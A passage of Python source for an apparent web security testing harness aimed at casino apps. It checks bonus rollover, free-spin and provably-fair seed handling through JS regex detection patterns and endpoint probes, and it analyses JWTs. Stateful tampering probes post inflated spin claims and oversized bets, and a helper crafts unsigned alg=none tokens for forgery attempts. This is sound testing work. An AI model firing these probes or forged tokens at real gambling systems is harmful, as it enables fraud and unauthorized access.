                    self.h.report["casino_bonus_rollover"].append(finding(
                        sev,
                        f"Client-side '{name}' pattern in JS. Bonus/rollover state must be authoritative on the server.",
                        fix="Treat bonus credit, rollover remaining, and max-bet-during-bonus as server-owned. Client displays only.",
                        url=url,
                        category="casino_bonus_rollover",
                        verdict=Verdict.FAIL.value if sev == "HIGH" else Verdict.INCONCLUSIVE.value,
                    ))

        path = self.cfg.bonus_endpoint
        if not path:
            self.log.info("  [skip] BONUS_ENDPOINT not configured — JS-pattern scan only.")
            verdict = Verdict.FAIL if js_fail else Verdict.INCONCLUSIVE
            self._record_verdict(
                "bonus_rollover", verdict,
                "BONUS_ENDPOINT not configured; cannot verify server accounting against Kodak policy."
                + (f" JS mutator/bypass hits={js_fail}." if js_fail else ""),
                severity="HIGH" if js_fail else "INFO",
                fix="Set AIO_BONUS_ENDPOINT to staging bonus status route.",
                category="casino_bonus_rollover",
            )
            return

        url = urljoin(self.cfg.target_url, path)
        try:
            r = self.h.http_get(url, headers=self.h.auth_headers())
            self.log.info("  [=] BONUS_ENDPOINT HTTP %s", r.status_code)
            if r.status_code >= 400:
                self._record_verdict(
                    "bonus_rollover", Verdict.INCONCLUSIVE,
                    f"Bonus status endpoint returned HTTP {r.status_code}.",
                    severity="INFO", url=url,
                    fix="Confirm staging auth + path.",
                    category="casino_bonus_rollover",
                )
                return
            try:
                data = r.json()
            except Exception:
                data = None
            if not isinstance(data, dict):
                self._record_verdict(
                    "bonus_rollover", Verdict.INCONCLUSIVE,
                    f"Bonus endpoint returned non-JSON or non-object body (len={len(r.text[:12000])}).",
                    severity="INFO", url=url,
                    fix="Prefer structured JSON for bonus status so accounting can be verified.",
                    category="casino_bonus_rollover",
                )
                return

            flat = json.dumps(data)
            credit = None
            rollover_mult = None
            remaining = None
            for key in ("bonusCredit", "credit", "welcomeBonus", "amount", "bonus_amount"):
                if key in data and isinstance(data[key], (int, float)):
                    credit = data[key]
                    break
            for key in ("rollover", "rolloverMultiplier", "wageringRequirement", "rollover_x"):
                if key in data and isinstance(data[key], (int, float)):
                    rollover_mult = data[key]
                    break
            for key in ("rolloverRemaining", "wagerRemaining", "remainingWager"):
                if key in data and isinstance(data[key], (int, float)):
                    remaining = data[key]
                    break

            fails = js_fail
            if credit is not None and credit != policy["credit_gp"]:
                fails += 1
                self.h.report["casino_bonus_rollover"].append(finding(
                    "MEDIUM",
                    f"Server bonus credit={credit} differs from documented Kodak policy {policy['credit_gp']:,} GP.",
                    fix="Align staging bonus config with documented policy, or update BONUS_POLICY in the harness.",
                    url=url, category="casino_bonus_rollover", verdict=Verdict.FAIL.value,
                ))
            if rollover_mult is not None and rollover_mult != policy["rollover_multiplier"]:
                fails += 1
                self.h.report["casino_bonus_rollover"].append(finding(
                    "MEDIUM",
                    f"Server rollover multiplier={rollover_mult} differs from documented {policy['rollover_multiplier']}x.",
                    fix="Confirm server wagering requirement matches the Kodak 40x policy.",
                    url=url, category="casino_bonus_rollover", verdict=Verdict.FAIL.value,
                ))
            if remaining is not None and credit is not None and rollover_mult is not None:
                expected = credit * rollover_mult
                if remaining > expected:
                    fails += 1
                    self.h.report["casino_bonus_rollover"].append(finding(
                        "HIGH",
                        f"rolloverRemaining ({remaining}) exceeds credit*multiplier ({expected}). Possible accounting bug.",
                        fix="Cap remaining wager at credit × multiplier; audit bonus ledger.",
                        url=url, category="casino_bonus_rollover", verdict=Verdict.FAIL.value,
                    ))
            if re.search(r"(?i)\"(bypassRollover|skipWagering|forceClear)\"\s*:\s*true", flat):
                fails += 1
                self.h.report["casino_bonus_rollover"].append(finding(
                    "CRITICAL",
                    "Bonus API response contains a bypass/skip flag set true.",
                    fix="Never expose or honour client-supplied rollover bypass flags.",
                    url=url, category="casino_bonus_rollover", verdict=Verdict.FAIL.value,
                ))

            if fails:
                self._record_verdict(
                    "bonus_rollover", Verdict.FAIL,
                    f"Bonus/rollover checks failed ({fails} issue(s)) vs Kodak policy.",
                    severity="HIGH", url=url,
                    fix="Align server accounting with documented Kodak rules; remove client bypass knobs.",
                    category="casino_bonus_rollover",
                )
            elif credit is None and rollover_mult is None:
                self._record_verdict(
                    "bonus_rollover", Verdict.INCONCLUSIVE,
                    "Bonus endpoint reachable but no recognizable credit/rollover fields.",
                    severity="INFO", url=url,
                    fix="Expose bonusCredit + rolloverMultiplier + rolloverRemaining for verification.",
                    category="casino_bonus_rollover",
                )
            else:
                self._record_verdict(
                    "bonus_rollover", Verdict.PASS,
                    "Server bonus/rollover fields align with Kodak policy (or no discrepancies found).",
                    severity="INFO", url=url,
                    fix="Keep wagering authoritative on the server.",
                    category="casino_bonus_rollover",
                )
        except Exception as e:
            self.h.report["errors"].append(f"Bonus rollover probe error: {e}")
            self._record_verdict(
                "bonus_rollover", Verdict.INCONCLUSIVE,
                f"Bonus rollover probe error: {e}",
                severity="INFO", category="casino_bonus_rollover",
            )

        # Optional STATEFUL oversized bet — only if policy defines a max-bet
        if self.cfg.run_stateful and self.h.jwt_configured("A"):
            bet = self.cfg.bet_endpoint
            if bet and policy["max_bet_while_active"] is None:
                self.h.report["casino_bonus_rollover"].append(finding(
                    "INFO",
                    (
                        "RUN_STATEFUL=True but Kodak policy has max_bet_while_active=None "
                        "(no max-bet restriction while bonus active). No oversized-bet reject "
                        "assertion is made — only accounting integrity is checked via BONUS_ENDPOINT."
                    ),
                    fix="If you later add a max-bet-during-bonus rule, set BONUS_POLICY['max_bet_while_active'] and re-run.",
                    category="casino_bonus_rollover",
                ))
            elif bet and policy["max_bet_while_active"] is not None:
                url = urljoin(self.cfg.target_url, bet)
                over = policy["max_bet_while_active"] * 10
                try:
                    r = self.h.http_post(
                        url, headers=self.h.auth_headers(),
                        json_body={"amount": over, "currency": "GP", "fundSource": "bonus", "_probe": "aio-bonus-maxbet"},
                    )
                    accepted = 200 <= r.status_code < 300
                    self.h.report["casino_bonus_rollover"].append(finding(
                        "HIGH" if accepted else "INFO",
                        (
                            f"Oversized bonus-funded bet (amount={over}) ACCEPTED (HTTP {r.status_code})."
                            if accepted else
                            f"Oversized bonus-funded bet rejected (HTTP {r.status_code}) — expected under max-bet policy."
                        ),
                        fix="Enforce max-bet-during-bonus server-side when the policy defines one.",
                        url=url, category="casino_bonus_rollover",
                        verdict=(Verdict.FAIL if accepted else Verdict.PASS).value,
                    ))
                except Exception as e:
                    self.h.report["errors"].append(f"Bonus max-bet probe error: {e}")
        elif not self.cfg.run_stateful:
            self.log.info("  [skip] RUN_STATEFUL=False — no stateful bonus bet probes.")


    # ---- free-spin / scatter ----
    def scan_freespin_scatter(self) -> None:
        self.log.info("Casino free-spin / scatter rule check (read-only)...")
        pol = SCATTER_POLICY
        self.h.report["casino_freespin_scatter"].append(finding(
            "INFO",
            (
                f"Policy baseline: 5 scatters => {pol['scatters_5_payout_mult']}x stake + "
                f"{pol['free_spins_on_scatter']} free spins; "
                f"6+ same as 5={pol['scatters_6plus_same_as_5']}; "
                f"retrigger={pol['retrigger_spins']} spins."
            ),
            fix="Server must be the sole authority for granted free-spin counts and scatter payouts.",
            category="casino_freespin_scatter",
            baseline=True,  # informational baseline — excluded from verdict rollup
        ))

        patterns = {
            "client freeSpin grant": r"(?i)(grantFreeSpins|addFreeSpins|setFreeSpins)\s*\(",
            "scatter payout table": r"(?i)[\"']?scatter(?:Pay|Payout|Multiplier)[\"']?\s*[:=]",
            "retrigger constant": r"(?i)[\"']?retrigger(?:Spins|Count)?[\"']?\s*[:=]\s*\d+",
            "free spin counter mutator": r"(?i)freeSpins\s*[+\-]=",
        }
        js_fail = 0
        for url, text in self.h.js_bundle_texts.items():
            for name, pat in patterns.items():
                if re.search(pat, text):
                    sev = "HIGH" if "grant" in name or "mutator" in name else "MEDIUM"
                    if sev == "HIGH":
                        js_fail += 1
                    self.h.report["casino_freespin_scatter"].append(finding(
                        sev,
                        f"Client-side '{name}' pattern. Spins/payouts must come from server round results.",
                        fix="Client may render server-granted spin counts only; never invent or increment locally.",
                        url=url, category="casino_freespin_scatter",
                        verdict=(Verdict.FAIL if sev == "HIGH" else Verdict.INCONCLUSIVE).value,
                    ))
            for m in re.finditer(
                r"(?i)[\"']?(freeSpins|retriggerSpins|scatterFreeSpins)[\"']?\s*[:=]\s*(\d+)", text
            ):
                key, val = m.group(1), int(m.group(2))
                expected = {
                    "freespins": pol["free_spins_on_scatter"],
                    "scatterfreespins": pol["free_spins_on_scatter"],
                    "retriggerspins": pol["retrigger_spins"],
                }.get(key.lower())
                if expected is not None and val != expected:
                    js_fail += 1
                    self.h.report["casino_freespin_scatter"].append(finding(
                        "MEDIUM",
                        f"JS hardcodes {key}={val}, documented policy expects {expected}.",
                        fix="Align client constants with server policy, or remove client-side constants entirely.",
                        url=url, category="casino_freespin_scatter",
                        verdict=Verdict.FAIL.value,
                    ))

        path = self.cfg.freespin_endpoint
        if not path:
            self.log.info("  [skip] FREESPIN_ENDPOINT not configured — JS-pattern scan only.")
            verdict = Verdict.FAIL if js_fail else Verdict.INCONCLUSIVE
            self._record_verdict(
                "freespin_scatter", verdict,
                "FREESPIN_ENDPOINT not configured; cannot compare server grants to scatter policy."
                + (f" JS issues={js_fail}." if js_fail else ""),
                severity="HIGH" if js_fail else "INFO",
                fix="Set AIO_FREESPIN_ENDPOINT.",
                category="casino_freespin_scatter",
            )
            return

        url = urljoin(self.cfg.target_url, path)
        try:
            r = self.h.http_get(url, headers=self.h.auth_headers())
            self.log.info("  [=] FREESPIN_ENDPOINT HTTP %s", r.status_code)
            if r.status_code >= 400:
                self._record_verdict(
                    "freespin_scatter", Verdict.INCONCLUSIVE,
                    f"Free-spin status returned HTTP {r.status_code}.",
                    severity="INFO", url=url, fix="Confirm staging auth + path.",
                    category="casino_freespin_scatter",
                )
                return
            try:
                data = r.json()
            except Exception:
                data = None
            if not isinstance(data, dict):
                self._record_verdict(
                    "freespin_scatter", Verdict.INCONCLUSIVE,
                    "Free-spin endpoint returned non-object JSON.",
                    severity="INFO", url=url,
                    fix="Return structured { grantedSpins, scatterCount, payoutMult, source: 'server' }.",
                    category="casino_freespin_scatter",
                )
                return

            granted = None
            for key in ("grantedSpins", "freeSpins", "spinsRemaining", "free_spins"):
                if key in data and isinstance(data[key], (int, float)):
                    granted = int(data[key])
                    break
            scatter_count = None
            for key in ("scatterCount", "scatters", "scatter_count"):
                if key in data and isinstance(data[key], (int, float)):
                    scatter_count = int(data[key])
                    break
            payout_mult = None
            for key in ("payoutMult", "scatterPayout", "payoutMultiplier"):
                if key in data and isinstance(data[key], (int, float)):
                    payout_mult = data[key]
                    break

            fails = js_fail
            if scatter_count is not None and scatter_count >= 5:
                if payout_mult is not None and payout_mult != pol["scatters_5_payout_mult"]:
                    fails += 1
                    self.h.report["casino_freespin_scatter"].append(finding(
                        "HIGH",
                        (
                            f"Server payoutMult={payout_mult} for scatterCount={scatter_count}; "
                            f"policy expects {pol['scatters_5_payout_mult']}x for 5 and 6+."
                        ),
                        fix="Enforce 6+ scatters pay same as 5 (20x) server-side.",
                        url=url, category="casino_freespin_scatter", verdict=Verdict.FAIL.value,
                    ))
                if granted is not None and granted not in (pol["free_spins_on_scatter"], pol["retrigger_spins"]):
                    self.h.report["casino_freespin_scatter"].append(finding(
                        "MEDIUM",
                        (
                            f"grantedSpins={granted} is neither the scatter grant "
                            f"({pol['free_spins_on_scatter']}) nor retrigger ({pol['retrigger_spins']}). "
                            "Manual review: remaining mid-round is OK; inflated grants are not."
                        ),
                        fix="Audit free-spin ledger; reject client-claimed spin counts that exceed server grants.",
                        url=url, category="casino_freespin_scatter",
                        verdict=Verdict.INCONCLUSIVE.value,
                    ))
            else:
                self.h.report["casino_freespin_scatter"].append(finding(
                    "INFO",
                    f"Free-spin status parsed (granted={granted}, scatters={scatter_count}, mult={payout_mult}).",
                    fix="Keep server as sole grant authority.",
                    url=url, category="casino_freespin_scatter",
                ))

            if self.cfg.run_stateful and self.h.jwt_configured("A"):
                try:
                    claim = {"claimedSpins": 999, "scatterCount": 6, "_probe": "aio-freespin-claim"}
                    pr = self.h.http_post(url, headers=self.h.auth_headers(), json_body=claim)
                    accepted = 200 <= pr.status_code < 300
                    echoed = False
                    try:
                        pj = pr.json()
                        if isinstance(pj, dict) and int(pj.get("grantedSpins") or pj.get("freeSpins") or 0) >= 999:
                            echoed = True
                    except Exception:
                        pass
                    sev = "CRITICAL" if (accepted and echoed) else ("HIGH" if accepted else "INFO")
                    if accepted:
                        fails += 1
                    self.h.report["casino_freespin_scatter"].append(finding(
                        sev,
                        (
                            f"Client-inflated free-spin claim (999) accepted/echoed (HTTP {pr.status_code}, echoed={echoed})."
                            if accepted else
                            f"Client-inflated free-spin claim rejected (HTTP {pr.status_code}) — expected."
                        ),
                        fix="Ignore client-claimed spin counts; grant only from server-side scatter evaluation.",
                        url=url, category="casino_freespin_scatter",
                        verdict=(Verdict.FAIL if accepted else Verdict.PASS).value,
                    ))
                except Exception as e:
                    self.h.report["errors"].append(f"Free-spin claim probe error: {e}")
            elif not self.cfg.run_stateful:
                self.log.info("  [skip] RUN_STATEFUL=False — no client-claim POST.")

            if fails:
                self._record_verdict(
                    "freespin_scatter", Verdict.FAIL,
                    f"Free-spin/scatter checks failed ({fails} issue(s)) vs documented rules.",
                    severity="HIGH", url=url,
                    fix="Enforce scatter payout + spin grants server-side only.",
                    category="casino_freespin_scatter",
                )
            else:
                self._record_verdict(
                    "freespin_scatter", Verdict.PASS,
                    "No free-spin/scatter policy violations detected.",
                    severity="INFO", url=url,
                    fix="Keep server as sole grant authority.",
                    category="casino_freespin_scatter",
                )
        except Exception as e:
            self.h.report["errors"].append(f"Free-spin/scatter probe error: {e}")
            self._record_verdict(
                "freespin_scatter", Verdict.INCONCLUSIVE,
                f"Free-spin/scatter probe error: {e}",
                severity="INFO", category="casino_freespin_scatter",
            )

    # ---- provably fair (detection only) ----
    def scan_provably_fair(self) -> None:
        self.log.info("Casino provably-fair seed checks (detection/flag only)...")
        seed_patterns = {
            "serverSeed pre-reveal hex": r"(?i)[\"']?serverSeed[\"']?\s*[:=]\s*[\"'][a-f0-9]{16,}[\"']",
            "serverSeedHash only (ok)": r"(?i)[\"']?serverSeedHash[\"']?\s*[:=]\s*[\"'][a-f0-9]{32,}[\"']",
            "hmacSecret in client": r"(?i)[\"']?(hmacSecret|seedSecret|fairnessSecret)[\"']?\s*[:=]",
            "client outcome derive": r"(?i)(deriveOutcome|calculateResult|generateRoll)\s*\(",
            "nonce pattern": r"(?i)[\"']?nonce[\"']?\s*[:=]\s*\d+",
        }
        fails = 0
        for url, text in self.h.js_bundle_texts.items():
            if re.search(seed_patterns["serverSeed pre-reveal hex"], text):
                fails += 1
                self.h.report["casino_provably_fair"].append(finding(
                    "CRITICAL",
                    "Raw serverSeed hex appears in client JS — must only be revealed AFTER the round.",
                    fix="Expose serverSeedHash before the round; reveal serverSeed only after. Never ship raw seeds in bundles.",
                    url=url, category="casino_provably_fair", verdict=Verdict.FAIL.value,
                ))
            if re.search(seed_patterns["hmacSecret in client"], text):
                fails += 1
                self.h.report["casino_provably_fair"].append(finding(
                    "CRITICAL",
                    "Fairness HMAC/secret referenced in client JS.",
                    fix="Keep HMAC secrets server-side only.",
                    url=url, category="casino_provably_fair", verdict=Verdict.FAIL.value,
                ))
            if re.search(seed_patterns["client outcome derive"], text):
                fails += 1
                self.h.report["casino_provably_fair"].append(finding(
                    "HIGH",
                    "Client-side outcome derivation function detected. Outcomes must be computed server-side.",
                    fix="Move roll/outcome generation to the server; client verifies with revealed seeds after the fact.",
                    url=url, category="casino_provably_fair", verdict=Verdict.FAIL.value,
                ))
            if re.search(r"(?i)clientSeed\s*[:=]\s*(String\()?Date\.now|clientSeed\s*[:=]\s*[\"']?\d{10,}", text):
                self.h.report["casino_provably_fair"].append(finding(
                    "MEDIUM",
                    "Client seed appears derived from Date.now / a numeric timestamp — low entropy / predictable.",
                    fix="Use CSPRNG for clientSeed (e.g. crypto.getRandomValues) and allow user-supplied seeds.",
                    url=url, category="casino_provably_fair", verdict=Verdict.FAIL.value,
                ))
                fails += 1
            if re.search(seed_patterns["serverSeedHash only (ok)"], text) and not re.search(
                seed_patterns["serverSeed pre-reveal hex"], text
            ):
                self.h.report["casino_provably_fair"].append(finding(
                    "INFO",
                    "serverSeedHash pattern present without raw serverSeed — good pre-reveal posture (JS scan).",
                    fix="Keep revealing the raw seed only after the round settles.",
                    url=url, category="casino_provably_fair", verdict=Verdict.PASS.value,
                ))

        path = self.cfg.seed_endpoint
        if path:
            url = urljoin(self.cfg.target_url, path)
            try:
                r = self.h.http_get(url, headers=self.h.auth_headers())
                self.log.info("  [=] SEED_ENDPOINT HTTP %s", r.status_code)
                body = r.text[:12000]
                if r.status_code < 400:
                    if re.search(r"(?i)\"serverSeed\"\s*:\s*\"[a-f0-9]{16,}\"", body):
                        fails += 1
                        self.h.report["casino_provably_fair"].append(finding(
                            "HIGH",
                            (
                                "SEED_ENDPOINT response includes raw serverSeed. "
                                "Confirm this is a post-reveal endpoint only; pre-reveal exposure is CRITICAL."
                            ),
                            fix="Split endpoints: /seed/hash (pre) vs /seed/reveal (post). Never return raw seed early.",
                            url=url, category="casino_provably_fair", verdict=Verdict.INCONCLUSIVE.value,
                        ))
                    if re.search(r"(?i)\"(hmacSecret|seedSecret)\"\s*:", body):
                        fails += 1
                        self.h.report["casino_provably_fair"].append(finding(
                            "CRITICAL",
                            "SEED_ENDPOINT response exposes hmac/seed secret field.",
                            fix="Strip secrets from all client-visible responses.",
                            url=url, category="casino_provably_fair", verdict=Verdict.FAIL.value,
                        ))
                    for m in re.finditer(r"(?i)\"clientSeed\"\s*:\s*\"([^\"]+)\"", body):
                        cs = m.group(1)
                        if cs.isdigit() or len(cs) < 8:
                            fails += 1
                            self.h.report["casino_provably_fair"].append(finding(
                                "MEDIUM",
                                f"clientSeed looks low-entropy (len={len(cs)}, digit-only={cs.isdigit()}).",
                                fix="Require high-entropy client seeds; reject weak values server-side.",
                                url=url, category="casino_provably_fair", verdict=Verdict.FAIL.value,
                            ))
                    # NOTE: we deliberately do NOT compute or predict outcomes from seeds.
                    self.h.report["casino_provably_fair"].append(finding(
                        "INFO",
                        "Provably-fair seed endpoint reachable. Outcome-prediction is intentionally NOT implemented.",
                        fix="Continue to treat seed material as detection-only in this harness.",
                        url=url, category="casino_provably_fair",
                    ))
            except Exception as e:
                self.h.report["errors"].append(f"Provably-fair seed probe error: {e}")
                self._record_verdict(
                    "provably_fair", Verdict.INCONCLUSIVE,
                    f"Provably-fair seed probe error: {e}",
                    severity="INFO", category="casino_provably_fair",
                )
                return
        else:
            self.log.info("  [skip] SEED_ENDPOINT not configured — JS-pattern scan only.")

        if fails:
            self._record_verdict(
                "provably_fair", Verdict.FAIL,
                f"Provably-fair detection found {fails} issue(s) (no outcome prediction performed).",
                severity="HIGH",
                fix="Keep raw seeds/HMAC secrets server-side; reveal only after settle.",
                category="casino_provably_fair",
            )
        else:
            self._record_verdict(
                "provably_fair", Verdict.PASS if self.h.js_bundle_texts or path else Verdict.INCONCLUSIVE,
                "No pre-reveal seed / HMAC / client-derive issues detected (detection-only).",
                severity="INFO",
                fix="Keep revealing the raw seed only after the round settles.",
                category="casino_provably_fair",
            )

    def business_logic_rollup(self) -> Dict[str, Any]:
        """Severity + verdict rollup for casino business-logic findings."""
        cats = [
            "casino_bonus_rollover", "casino_freespin_scatter", "casino_provably_fair",
            "casino_payout_integrity", "casino_race", "casino_amount_validation",
        ]
        sev = {"CRITICAL": 0, "HIGH": 0, "MEDIUM": 0, "LOW": 0, "INFO": 0}
        verdicts = {"PASS": 0, "FAIL": 0, "INCONCLUSIVE": 0}

        def _is_baseline_or_info_only(f: Dict[str, Any]) -> bool:
            """Baselines / pure INFO notes must not drive the overall verdict."""
            if f.get("baseline"):
                return True
            detail = str(f.get("detail", ""))
            if detail.startswith("Policy baseline:"):
                return True
            # Informational entries with no real check outcome stay out of the rollup
            if str(f.get("severity", "")).upper() == "INFO" and not f.get("verdict"):
                return True
            return False

        for cat in cats:
            for f in self.h.report.get(cat, []):
                if not isinstance(f, dict):
                    continue
                s = str(f.get("severity", "INFO")).upper()
                sev[s] = sev.get(s, 0) + 1
                # Exclude baselines / informational-only entries from verdict tally
                if _is_baseline_or_info_only(f):
                    continue
                v = str(f.get("verdict", "")).upper()
                if v in verdicts:
                    verdicts[v] += 1
        # Also count module-level verdicts (real check outcomes only; skip baselines)
        for ventry in self.verdicts:
            if not isinstance(ventry, dict):
                continue
            if _is_baseline_or_info_only(ventry):
                continue
            v = str(ventry.get("verdict", "")).upper()
            if v in verdicts:
                verdicts[v] += 1
        # FAIL wins; PASS wins over remaining INCONCLUSIVE; else INCONCLUSIVE / PASS
        overall = "PASS"
        if sev.get("CRITICAL", 0) or sev.get("HIGH", 0) or verdicts["FAIL"]:
            overall = "FAIL"
        elif verdicts["PASS"]:
            overall = "PASS"
        elif verdicts["INCONCLUSIVE"]:
            overall = "INCONCLUSIVE"
        return {
            "overall_verdict": overall,
            "severity_breakdown": sev,
            "verdict_breakdown": verdicts,
            "module_verdicts": self.verdicts,
        }


# ---------------------------------------------------------------------------
# Main harness
# ---------------------------------------------------------------------------
class MaxRedOpsHarness:
    REPORT_CATEGORIES = [
        "jwt_analysis", "dom_xss", "storage_exposure", "route_bypass", "idor_bola",
        "api_endpoints", "nuclei_findings", "websocket_findings", "graphql_findings",
        "cors_findings", "prototype_pollution", "postmessage_issues", "race_conditions",
        "security_headers", "open_redirects", "js_secrets", "subdomains", "rate_limiting",
        "casino_race", "casino_payout_integrity", "casino_amount_validation",
        "reflected_xss_candidates", "ssrf_param_candidates", "http_method_tampering",
        "casino_bonus_rollover", "casino_freespin_scatter", "casino_provably_fair",
        "auth_jwt_forgery", "auth_session_fixation", "auth_cookie_flags", "auth_oauth_redirect",
        "access_control_matrix", "path_bypass", "csrf", "mass_assignment",
        "host_header", "subdomain_takeover",
        "hpp", "injection", "graphql_deep", "ssrf_real", "jwt_advanced",
    ]

    def __init__(self, cfg: AIOConfig, log: logging.Logger):
        self.cfg = cfg
        self.log = log
        self.start_time = _utc_now_iso()
        self.session = build_session(cfg)
        self.rate_limiter = RateLimiter(cfg.rate_limit_rps)
        self.sem = asyncio.Semaphore(cfg.max_concurrency)
        self.report: Dict[str, Any] = {
            "target": cfg.target_url,
            "timestamp": self.start_time,
            "run_stateful": cfg.run_stateful,
            "version": VERSION,
            "phases_requested": cfg.phases[:],
            "phases_executed": [],
            **{cat: [] for cat in self.REPORT_CATEGORIES},
            "errors": [],
            "summary": {},
            "business_logic": {},
            "phase_results": [],
        }
        # list-typed categories that aren't findings lists
        self.report["api_endpoints"] = []
        self.report["subdomains"] = []
        self.intercepted_requests: List[Dict[str, str]] = []
        self.ws_endpoints: Set[str] = set()
        self.js_bundle_texts: Dict[str, str] = {}
        self._set_cookies: List[str] = []
        self.casino = CasinoLogicModule(self)
        self._phase_results: List[PhaseResult] = []
        # v8: thread-safe report appends + http2 flag
        self._report_lock = threading.Lock()
        self.is_http2 = bool(cfg.http2 and HAS_HTTPX)
        if cfg.http2 and not HAS_HTTPX:
            self.log.warning("AIO_HTTP2 requested but httpx not installed — falling back to HTTP/1.1 (requests).")

    # ---- auth helpers ----
    def auth_headers(self, jwt: Optional[str] = None) -> Dict[str, str]:
        token = jwt or self.cfg.user_a_jwt
        if not token or "YOUR_USER" in token:
            return {}
        return {"Authorization": f"Bearer {token}", "Content-Type": "application/json"}

    def jwt_configured(self, which: str = "A") -> bool:
        tok = self.cfg.user_a_jwt if which == "A" else self.cfg.user_b_jwt
        return bool(tok) and "YOUR_USER" not in tok

    # ---- request signing (HMAC / API key), v8 ----
    def _sign_headers(self, method: str, url: str, body_bytes: bytes) -> Dict[str, str]:
        mode = (self.cfg.sign_mode or "").lower()
        if mode == "apikey":
            return {self.cfg.apikey_header: self.cfg.apikey_value} if self.cfg.apikey_value else {}
        if mode == "hmac":
            if not self.cfg.sign_secret:
                return {}
            path = urlparse(url).path or "/"
            algo = getattr(hashlib, (self.cfg.sign_algo or "sha256").lower(), hashlib.sha256)
            ts = str(int(time.time()))
            body_hash = hashlib.sha256(body_bytes or b"").hexdigest()
            msg = f"{method.upper()}\n{path}\n{ts}\n{body_hash}".encode()
            sig = hmac.new(self.cfg.sign_secret.encode(), msg, algo).hexdigest()
            out = {self.cfg.sign_header: sig, "X-Signature-Timestamp": ts}
            if self.cfg.sign_key_id:
                out[self.cfg.sign_key_id_header] = self.cfg.sign_key_id
            return out
        return {}

    def _prep_kwargs(self, method: str, url: str, kwargs: dict) -> dict:
        headers = dict(kwargs.pop("headers", {}) or {})
        body_bytes = b""
        if kwargs.get("json") is not None:
            body_bytes = json.dumps(kwargs["json"], separators=(",", ":")).encode()
        elif kwargs.get("data"):
            d = kwargs["data"]
            body_bytes = d if isinstance(d, (bytes, bytearray)) else str(d).encode()
        sig = self._sign_headers(method, url, body_bytes)
        if sig:
            headers.update(sig)
        if headers:
            kwargs["headers"] = headers
        if self.is_http2 and "allow_redirects" in kwargs:
            kwargs["follow_redirects"] = kwargs.pop("allow_redirects")
        return kwargs

    # ---- HTTP wrappers (rate-limited + timed + signed) ----
    def http_get(self, url: str, **kwargs: Any):
        self.rate_limiter.acquire_sync()
        timeout = kwargs.pop("timeout", self.cfg.request_timeout)
        kwargs = self._prep_kwargs("GET", url, kwargs)
        return self.session.get(url, timeout=timeout, **kwargs)

    def http_post(self, url: str, json_body: Optional[dict] = None, **kwargs: Any):
        self.rate_limiter.acquire_sync()
        timeout = kwargs.pop("timeout", self.cfg.request_timeout)
        kwargs["json"] = json_body
        kwargs = self._prep_kwargs("POST", url, kwargs)
        return self.session.post(url, timeout=timeout, **kwargs)

    def http_request(self, method: str, url: str, **kwargs: Any):
        self.rate_limiter.acquire_sync()
        timeout = kwargs.pop("timeout", self.cfg.request_timeout)
        kwargs = self._prep_kwargs(method, url, kwargs)
        return self.session.request(method, url, timeout=timeout, **kwargs)

    # ---- thread-safe report append (v8) ----
    def _add(self, category: str, f: Dict[str, Any]) -> None:
        with self._report_lock:
            self.report[category].append(f)

    # ---- JWT craft (gated forgery attempts) ----
    @staticmethod
    def _b64url(data: bytes) -> str:
        return base64.urlsafe_b64encode(data).rstrip(b"=").decode("ascii")

    def _craft_unsigned_jwt(self, header: dict, payload: dict) -> str:
        h = self._b64url(json.dumps(header, separators=(",", ":")).encode())
        p = self._b64url(json.dumps(payload, separators=(",", ":")).encode())
        return f"{h}.{p}."

    def preflight_check(self) -> None:
        missing = [t for t in ["nuclei", "docker", "subfinder"] if not shutil.which(t)]
        if missing:
            self.log.warning("Missing optional dependencies: %s. Continuing with reduced capability.", ", ".join(missing))
        if not HAS_PLAYWRIGHT and not self.cfg.skip_playwright:
            self.log.warning("playwright not installed — SPA crawl will be skipped.")
        self.log.info("Preflight complete. RUN_STATEFUL=%s", self.cfg.run_stateful)
        self.log.info("TARGET_URL=%s (env-overridable; domain guard still active)", self.cfg.target_url)
        empty = [k for k, v in self.cfg.casino_endpoints().items() if not v]
        if empty:
            self.log.warning("CASINO_ENDPOINTS empty for: %s (those modules will no-op until filled).", ", ".join(empty))
        self.log.info(
            "JWT A configured: %s | JWT B configured: %s",
            self.jwt_configured("A"), self.jwt_configured("B"),
        )
        self.log.info(
            "Phases: %s | concurrency=%s | rate_limit=%.1f rps",
            ",".join(resolve_phases(self.cfg.phases)),
            self.cfg.max_concurrency,
            self.cfg.rate_limit_rps,
        )

    # ------------------------------------------------------------------
    # JWT analysis
    # ------------------------------------------------------------------
    def analyze_jwt(self, token: str) -> None:
        if not token or token.count(".") != 2:
            return
        try:
            header_b64, payload_b64, signature_b64 = token.split(".")

            def b64decode(s: str) -> dict:
                s += "=" * (-len(s) % 4)
                return json.loads(base64.urlsafe_b64decode(s).decode("utf-8", errors="replace"))

            header = b64decode(header_b64)
            payload = b64decode(payload_b64)
            findings: List[dict] = []
            now = int(datetime.now(timezone.utc).timestamp())
            alg = header.get("alg", "").upper()
            if alg == "NONE":
                findings.append(finding(
                    "CRITICAL", "alg=none. Signature bypass possible if accepted.",
                    fix="Reject alg=none. Require a strong algorithm and validate the signature.",
                    category="jwt_analysis",
                ))
            elif alg in ("HS256", "HS384", "HS512"):
                findings.append(finding(
                    "MEDIUM", f"Symmetric algorithm ({alg}). Algorithm confusion surface if RS* expected.",
                    fix="Prefer asymmetric algorithms. If HS* is required, use a long random secret and strictly enforce the expected alg.",
                    category="jwt_analysis",
                ))
            if "exp" not in payload:
                findings.append(finding(
                    "HIGH", "Missing exp. Token never expires.",
                    fix="Always set a short exp claim. Prefer minutes to hours for access tokens.",
                    category="jwt_analysis",
                ))
            elif isinstance(payload.get("exp"), (int, float)):
                delta = payload["exp"] - now
                if delta < 0:
                    findings.append(finding(
                        "INFO", f"Token expired (delta {delta}s).",
                        fix="Normal. Ensure clients refresh properly.",
                        category="jwt_analysis",
                    ))
                elif delta > 86400 * 30:
                    findings.append(finding(
                        "MEDIUM", f"Long-lived token (~{delta // 86400} days).",
                        fix="Shorten access token lifetime. Use refresh tokens for longer sessions.",
                        category="jwt_analysis",
                    ))
            for claim in ("role", "roles", "isAdmin", "admin", "permissions"):
                if claim in payload:
                    val = payload[claim]
                    elevated = (
                        (isinstance(val, str) and val.lower() in ("admin", "administrator"))
                        or (isinstance(val, bool) and val)
                        or (isinstance(val, list) and any(str(x).lower() == "admin" for x in val))
                    )
                    if elevated:
                        findings.append(finding(
                            "HIGH", f"Elevated claim: {claim}={val}",
                            fix="Avoid embedding role claims that can be trusted solely from the client. Validate on the server.",
                            category="jwt_analysis",
                        ))
            for k in payload:
                if any(p in k.lower() for p in ("password", "secret", "ssn", "private")):
                    findings.append(finding(
